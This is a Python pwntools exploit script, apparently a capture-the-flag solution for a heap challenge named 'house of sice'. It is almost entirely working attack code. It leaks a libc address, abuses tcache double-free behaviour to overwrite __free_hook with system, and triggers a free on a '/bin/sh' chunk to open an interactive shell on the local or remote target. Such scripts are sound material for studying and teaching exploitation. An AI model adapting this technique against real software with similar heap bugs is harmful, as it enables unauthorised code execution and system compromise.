#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = 'house-of-sice.hsc.tf', 1337
binary = './housemod'
brkpts = '''
'''

elf = ELF("housemod")
libc = ELF("libc-2.31.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote(remote_ip, port)
    context.noptrace = True

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.31.so'})

def choice(idx):
    sla("\n> ", str(idx))

def add(type, value):
    choice(1)
    choice(type)
    choice(value)

def free(idx):
    choice(2)
    choice(idx)

if __name__ == "__main__":
    reu("deet: ")
    libc.address = int(re(14), 16) - libc.symbols['system']
    free_hook = libc.symbols['__free_hook']
    system = libc.symbols['system']

    for i in range(8):
        add(1, 0xdeadbeef)

    for i in range(8):
        free(i)

    add(1, 0xdeadbeef)
    free(7)
    add(2, free_hook)
    add(1, u64("/bin/sh\x00"))
    add(1, system)

    gdb.attach(io)
    free(7)

    io.interactive()
